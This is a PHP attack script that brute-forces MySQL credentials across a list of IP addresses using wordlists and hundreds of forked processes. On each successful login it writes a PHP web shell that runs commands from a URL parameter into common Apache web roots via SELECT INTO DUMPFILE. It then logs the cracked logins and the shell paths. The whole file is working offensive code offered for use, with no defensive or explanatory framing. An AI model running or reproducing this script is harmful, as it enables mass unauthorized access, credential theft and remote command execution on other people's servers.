<?php
$servers = 'ip.txt';
$users = 'users.txt';
$pass = 'pass.txt';
$threads = 400;
$logs = 'logs.txt';
$good = 'rez.txt';

ini_set('memory_limit', '1024M');

$doc_root[] = '/usr/local/apache2/htdocs';
$doc_root[] = '/var/www';
$doc_root[] = '/var/www/html';
$doc_root[] = '/Library/WebServer/Documents';
$doc_root[] = '/usr/pkg/share/httpd/htdocs';
$doc_root[] = '/usr/local/www/apache22/data';
$doc_root[] = '/usr/local/www/data';
$doc_root[] = '/var/www/htdocs';
$doc_root[] = '/var/apache2/htdocs/';
$doc_root[] = 'C:/Program Files/Apache Software Foundation/Apache2.2/htdocs';
$doc_root[] = '/var/apache2/htdocs';
$doc_root[] = '/svr/httpd/htdocs';
$doc_root[] = '/srv/www/htdocs';
$doc_root[] = '/var/www/localhost/htdocs';

echo 'Reading '.$servers.'...'.PHP_EOL;
$o_sv = file_get_contents($servers);
$o_sv = explode(PHP_EOL, $o_sv);

echo 'Reading '.$users.'...'.PHP_EOL;
$o_us = file_get_contents($users);
$o_us = explode(PHP_EOL, $o_us);

echo 'Reading '.$pass.'...'.PHP_EOL;
$o_pw = file_get_contents($pass);
$o_pw = explode(PHP_EOL, $o_pw);

if (file_exists($logs))
{
	echo 'Reading '.$logs.'...'.PHP_EOL;
	$o_lo = file_get_contents($logs);
	$o_lo = explode(PHP_EOL, $o_lo);
}

echo 'Sharing unscanned IPs for each thread...'.PHP_EOL;
$per_thread = ceil(count($o_sv)/$threads);
$crt_array = array();
$array_pos = 0;
$pos = 0;

foreach ($o_sv as $sv)
{
	$insert = true;
	// if (isset($o_lo))
	// {
		// if (in_array($sv, $o_lo))
		// {
			// $insert = false;
		// }
	// }
	
	if ($insert)
	{
		$pos++;
		$crt_array[$array_pos][] = $sv;
		if ($pos == $per_thread)
		{
			$pos = 0;
			$array_pos++;
		}
	}
}

echo 'Creating and opening log files...'.PHP_EOL;
$log = fopen($logs, 'a+');
$log2 = fopen($good, 'a+');
$done_ip = array();

echo 'Start cracking passwords...'.PHP_EOL;
for ($i = 0; $i<count($crt_array); $i++)
{
	$pid = pcntl_fork();
	if (!$pid)
	{
		foreach ($crt_array[$i] as $srv)
		{			
			foreach ($o_us as $thisUser)
			{
				foreach ($o_pw as $thisPass)
				{
					if ((!in_array($srv, $done_ip)) && ($srv != '') && ($thisUser != ''))
					{
						$connect = @mysql_connect($srv, $thisUser, $thisPass);
						if ($connect)
						{
							$sql = mysql_query('SHOW VARIABLES LIKE "version_compile_os"');
							$get = mysql_fetch_array($sql);
							
							$shell = '';
							
							$sql_f1 = @mysql_query('CREATE DATABASE fuck', $connect);
							if ($sql_f1)
							{
								$sql_f2 = @mysql_select_db('fuck', $connect);
								if ($sql_f2)
								{
									$sql_f3 = @mysql_query('CREATE TABLE fuck(PACKET TEXT)', $connect);
									if ($sql_f3)
									{
										$sql_f4 = @mysql_query('INSERT INTO fuck (packet)VALUES("<pre><body bgcolor=silver><? @system($_GET[\'cmd\']); ?></body></pre>")', $connect);
										if ($sql_f4)
										{
											foreach ($doc_root as $dr)
											{
												$sql_f5 = @mysql_query('SELECT * INTO DUMPFILE \''.$dr.'/faq1.php\' FROM fuck', $connect);
												if ($sql_f5)
												{
													$shell = ' Shell: /faq1.php?cmd=id';
													@mysql_query('drop database fuck', $connect);
													break;
												}
												else if (mysql_errno() == 13)
												{
													@mysql_query('drop database fuck', $connect);
													break;
												}
											}
											@mysql_query('drop database fuck', $connect);
										}
									}
								}
								
							}
							
							fwrite($log2, 'IP: '.$srv.' User: '.$thisUser.' Pass: '.$thisPass.' Dbs: 1337 OS:'.$get[1].$shell.PHP_EOL);
							$done_ip[] = $srv;
							echo $thisUser.':'.$thisPass.'@'.$srv.' -- Login success'.PHP_EOL;
						}
						else
						{
							echo $thisUser.':'.$thisPass.'@'.$srv.' -- Login failed'.PHP_EOL;
						}
					}
				}
			}
			fwrite($log, $srv.PHP_EOL);
		}
		exit($i);
	}
}

while (true)
{
	if (pcntl_waitpid(0, $status) == -1)
	{
		echo 'Done';
		break;
	}
}
?>

